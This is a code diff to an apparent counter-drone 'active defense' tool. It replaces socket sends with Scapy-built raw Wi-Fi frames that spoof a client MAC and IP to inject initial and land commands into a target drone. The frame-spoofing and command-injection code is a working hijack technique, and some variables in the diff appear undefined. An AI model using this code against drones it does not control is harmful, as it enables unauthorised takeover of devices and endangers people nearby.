@@ -54,37 +54,23 @@ def active_response_land(drone_model=None, custom_ip=None):
 
     status_label.configure(text=f"\n Will send active defense land command")
 
-def send_scapy_cmd(cmd_str):
-    profiles=load_drone_json()   
-    if drone_model is None:
-        status_label.configure(text="Please provide drone_model in the json config file.")
-        return
+    def send_scapy_cmd(cmd_str):
+        dot11 = Dot11(type=2, subtype=0, addr1=target_mac, addr2=fake_client_mac, addr3=target_mac)
     
-    # drone_model is absent in the json config file.
-    if drone_model not in profiles:
-        status_label.configure(f'Cannot find drone_model in json config file.')
-        return
-    
-    profile=profiles[drone_model]
-    dot11 = Dot11(type=2, subtype=0, addr1=target_mac, addr2=fake_client_mac, addr3=target_mac)
-    
-    pkt = RadioTap() / dot11 / LLC() / SNAP() / IP(src=fake_client_ip, dst=target_ip) / UDP(sport=8889, dport=target_port) / cmd_str
+        pkt = RadioTap() / dot11 / LLC() / SNAP() / IP(src=fake_client_ip, dst=target_ip) / UDP(sport=8889, dport=target_port) / cmd_str
         
-    sendp(pkt, iface=iface, verbose=False)
+        sendp(pkt, iface=iface, verbose=False)
 
 
     try:
         if profile.get("initial_command"):
-            status_label.configure(text="send intial command")
-            # Change string into UTF-8
-            initial_bytes=profile["initial_command"].encode('utf-8')
-            sock.sendto(initial_bytes,(target_ip,target_port))
+            status_label.configure(text="send initial command")
+            send_scapy_cmd(profile["initial_command"])
             time.sleep(0.5)
 
         if profile.get("land_cmd"):
             status_label.configure(text="Send land command now")
-            land_bytes=profile["land_cmd"].encode('utf-8')
-            sock.sendto(land_bytes, (target_ip,target_port))
+            send_scapy_cmd(profile["land_cmd"])
             status_label.configure(text="Land command sent successfully")
         
         else:
@@ -92,9 +78,6 @@ def send_scapy_cmd(cmd_str):
     except Exception as e:
          status_label.configure(text=f"Unsuccess : {e}")
 
-
-    finally:
-        sock.close()
 
 def btn_trigger_land():
 
